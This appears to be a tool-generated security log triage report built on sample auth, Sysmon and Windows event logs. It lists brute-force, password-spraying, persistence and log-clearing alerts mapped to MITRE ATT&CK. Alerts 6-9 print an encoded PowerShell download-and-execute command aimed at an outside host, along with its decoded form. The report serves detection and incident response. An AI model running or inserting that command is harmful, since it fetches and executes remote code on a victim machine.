# Log triage report

Generated from 85 security events in: `sample_logs/auth.log`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`

| Severity | Alerts |
|---|---|
| critical | 3 |
| high | 7 |
| medium | 6 |
| low | 0 |

## MITRE ATT&CK coverage

| Technique | Name | Alerts |
|---|---|---|
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | 2 |
| [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Command and Scripting Interpreter: PowerShell | 2 |
| [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Windows Event Logs | 1 |
| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | 1 |
| [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | 1 |
| [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | 3 |
| [T1110](https://attack.mitre.org/techniques/T1110/) | Brute Force | 1 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 2 |
| [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | 1 |
| [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 4 |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 4 |
| [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | 2 |

## Alerts

### 1. [CRITICAL] Successful login after repeated failures (AUTH-003)

- **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:55 UTC (25 events)
- **Host:** `web01`
- **User:** `root`
- **Source IP:** `203.0.113.45` (external)
- **ATT&CK:** T1110 Brute Force, T1078 Valid Accounts

root logged in from 203.0.113.45 after 24 failures from that IP in the previous 30 min (24 of them against this account). Treat as compromised until proven otherwise.

<details><summary>Evidence</summary>

```
Nov 10 02:13:06 web01 sshd[41220]: Failed password for root from 203.0.113.45 port 40000 ssh2
Nov 10 02:13:12 web01 sshd[41221]: Failed password for root from 203.0.113.45 port 40001 ssh2
Nov 10 02:13:21 web01 sshd[41222]: Failed password for root from 203.0.113.45 port 40002 ssh2
Nov 10 02:13:28 web01 sshd[41223]: Failed password for root from 203.0.113.45 port 40003 ssh2
Nov 10 02:13:33 web01 sshd[41224]: Failed password for root from 203.0.113.45 port 40004 ssh2
... 15 more ...
Nov 10 02:15:24 web01 sshd[41240]: Failed password for root from 203.0.113.45 port 40020 ssh2
Nov 10 02:15:33 web01 sshd[41241]: Failed password for root from 203.0.113.45 port 40021 ssh2
Nov 10 02:15:39 web01 sshd[41242]: Failed password for root from 203.0.113.45 port 40022 ssh2
Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 port 40023 ssh2
Nov 10 02:15:55 web01 sshd[41250]: Accepted password for root from 203.0.113.45 port 40031 ssh2
```

</details>

### 2. [CRITICAL] Newly created account added to privileged group (ACCT-003)

- **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:19:55 UTC (1 events)
- **Host:** `web01`
- **User:** `svc-backup`
- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account

'svc-backup' added to 'sudo' on web01, only 1 min after the account was created. Classic persistence pattern.

<details><summary>Evidence</summary>

```
Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
Nov 10 02:19:55 web01 usermod[41305]: add 'svc-backup' to group 'sudo'
```

</details>

### 3. [CRITICAL] Newly created account added to privileged group (ACCT-003)

- **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:43:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `helpdesk2`
- **ATT&CK:** T1098 Account Manipulation, T1136.001 Create Account: Local Account

'helpdesk2' added to 'Administrators' on WS-FIN-07.corp.example by thandi, only 2 min after the account was created. Classic persistence pattern.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 4720, "SubjectUserName": "thandi", "TargetUserName": "helpdesk2", "TimeCreated": "2026-11-10T09:41:00Z"}
{"Computer": "WS-FIN-07.corp.example", "EventID": 4732, "MemberName": "CN=helpdesk2,CN=Users,DC=corp,DC=example", "SubjectUserName": "thandi", "TargetUserName": "Administrators", "TimeCreated": "2026-11-10T09:43:00Z"}
```

</details>

### 4. [HIGH] Password spraying from single source (AUTH-002)

- **Time:** 2026-11-10 04:13:27 to 2026-11-10 04:18:41 UTC (20 events)
- **Host:** `web01`
- **Source IP:** `198.51.100.77` (external)
- **ATT&CK:** T1110.003 Brute Force: Password Spraying

198.51.100.77 failed 20 logins against 10 different accounts. Many users with few attempts each is typical of spraying.

<details><summary>Evidence</summary>

```
Nov 10 04:13:27 web01 sshd[41310]: Failed password for invalid user admin from 198.51.100.77 port 52000 ssh2
Nov 10 04:13:52 web01 sshd[41311]: Failed password for invalid user oracle from 198.51.100.77 port 52001 ssh2
Nov 10 04:14:03 web01 sshd[41312]: Failed password for invalid user test from 198.51.100.77 port 52002 ssh2
Nov 10 04:14:24 web01 sshd[41313]: Failed password for ubuntu from 198.51.100.77 port 52003 ssh2
Nov 10 04:14:39 web01 sshd[41314]: Failed password for postgres from 198.51.100.77 port 52004 ssh2
... 10 more ...
Nov 10 04:17:33 web01 sshd[41325]: Failed password for git from 198.51.100.77 port 52015 ssh2
Nov 10 04:17:47 web01 sshd[41326]: Failed password for invalid user jenkins from 198.51.100.77 port 52016 ssh2
Nov 10 04:18:07 web01 sshd[41327]: Failed password for invalid user ftpuser from 198.51.100.77 port 52017 ssh2
Nov 10 04:18:18 web01 sshd[41328]: Failed password for invalid user pi from 198.51.100.77 port 52018 ssh2
Nov 10 04:18:41 web01 sshd[41329]: Failed password for invalid user support from 198.51.100.77 port 52019 ssh2
```

</details>

### 5. [HIGH] Executable or script written by Office application (FILE-001)

- **Time:** 2026-11-10 09:13:54 to 2026-11-10 09:13:54 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File

winword.exe wrote C:\Users\thandi\AppData\Local\Temp\~invoice.vbs. Hash the file and check whether it was executed.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:13:54.000"}
```

</details>

### 6. [HIGH] Encoded PowerShell command (EXEC-001)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information

PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.

Decoded command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
```

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
```

</details>

### 7. [HIGH] Encoded PowerShell command (EXEC-001)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information

PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.

Decoded command:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
```

<details><summary>Evidence</summary>

```
{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
```

</details>

### 8. [HIGH] Office application spawned a shell or script host (EXEC-002)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment

winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
```

</details>

### 9. [HIGH] Office application spawned a shell or script host (EXEC-002)

- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment

winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.

<details><summary>Evidence</summary>

```
{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
```

</details>

### 10. [HIGH] Security event log cleared (EVADE-001)

- **Time:** 2026-11-10 09:55:00 to 2026-11-10 09:55:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1070.001 Indicator Removal: Clear Windows Event Logs

Security log on WS-FIN-07.corp.example was cleared by thandi. Attackers do this to hide their tracks; check what happened just before.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 1102, "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:55:00Z"}
```

</details>

### 11. [MEDIUM] Brute force against account(s) (AUTH-001)

- **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:46 UTC (24 events)
- **Host:** `web01`
- **User:** `root`
- **Source IP:** `203.0.113.45` (external)
- **ATT&CK:** T1110.001 Brute Force: Password Guessing

203.0.113.45 failed 24 logins (at least 10 within 5 min).

<details><summary>Evidence</summary>

```
Nov 10 02:13:06 web01 sshd[41220]: Failed password for root from 203.0.113.45 port 40000 ssh2
Nov 10 02:13:12 web01 sshd[41221]: Failed password for root from 203.0.113.45 port 40001 ssh2
Nov 10 02:13:21 web01 sshd[41222]: Failed password for root from 203.0.113.45 port 40002 ssh2
Nov 10 02:13:28 web01 sshd[41223]: Failed password for root from 203.0.113.45 port 40003 ssh2
Nov 10 02:13:33 web01 sshd[41224]: Failed password for root from 203.0.113.45 port 40004 ssh2
... 14 more ...
Nov 10 02:15:17 web01 sshd[41239]: Failed password for root from 203.0.113.45 port 40019 ssh2
Nov 10 02:15:24 web01 sshd[41240]: Failed password for root from 203.0.113.45 port 40020 ssh2
Nov 10 02:15:33 web01 sshd[41241]: Failed password for root from 203.0.113.45 port 40021 ssh2
Nov 10 02:15:39 web01 sshd[41242]: Failed password for root from 203.0.113.45 port 40022 ssh2
Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 port 40023 ssh2
```

</details>

### 12. [MEDIUM] Local account created (ACCT-001)

- **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:18:55 UTC (1 events)
- **Host:** `web01`
- **User:** `svc-backup`
- **ATT&CK:** T1136.001 Create Account: Local Account

New account 'svc-backup' created on web01.

<details><summary>Evidence</summary>

```
Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1
```

</details>

### 13. [MEDIUM] Script host connected to external address (NET-001)

- **Time:** 2026-11-10 09:14:06 to 2026-11-10 09:14:18 UTC (3 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1071.001 Application Layer Protocol: Web Protocols

powershell.exe on WS-FIN-07.corp.example connected to 198.51.100.23:80 3 time(s). Check the process command line and what was downloaded.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:06.000"}
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:12.000"}
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "DestinationIp": "198.51.100.23", "DestinationPort": 80, "EventID": 3, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "SourceIp": "10.20.4.17", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:18.000"}
```

</details>

### 14. [MEDIUM] Executable or script written by script host (FILE-001)

- **Time:** 2026-11-10 09:14:30 to 2026-11-10 09:14:30 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `thandi`
- **ATT&CK:** T1105 Ingress Tool Transfer, T1204.002 User Execution: Malicious File

powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the file and check whether it was executed.

<details><summary>Evidence</summary>

```
{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\update.exe", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:30.000"}
```

</details>

### 15. [MEDIUM] Brute force against account(s) (AUTH-001)

- **Time:** 2026-11-10 09:30:00 to 2026-11-10 09:32:48 UTC (15 events)
- **Host:** `JUMP01.corp.example`
- **User:** `administrator`
- **Source IP:** `203.0.113.199` (external)
- **ATT&CK:** T1110.001 Brute Force: Password Guessing

203.0.113.199 failed 15 logins (at least 10 within 5 min).

<details><summary>Evidence</summary>

```
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:00Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:12Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:24Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:36Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:30:48Z"}
... 5 more ...
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:00Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:12Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:24Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:36Z"}
{"Computer": "JUMP01.corp.example", "EventID": 4625, "IpAddress": "203.0.113.199", "LogonType": 10, "Status": "0xc000006d", "SubStatus": "0xc000006a", "TargetUserName": "administrator", "TimeCreated": "2026-11-10T09:32:48Z"}
```

</details>

### 16. [MEDIUM] Local account created (ACCT-001)

- **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:41:00 UTC (1 events)
- **Host:** `WS-FIN-07.corp.example`
- **User:** `helpdesk2`
- **ATT&CK:** T1136.001 Create Account: Local Account

New account 'helpdesk2' created on WS-FIN-07.corp.example by thandi.

<details><summary>Evidence</summary>

```
{"Computer": "WS-FIN-07.corp.example", "EventID": 4720, "SubjectUserName": "thandi", "TargetUserName": "helpdesk2", "TimeCreated": "2026-11-10T09:41:00Z"}
```

</details>

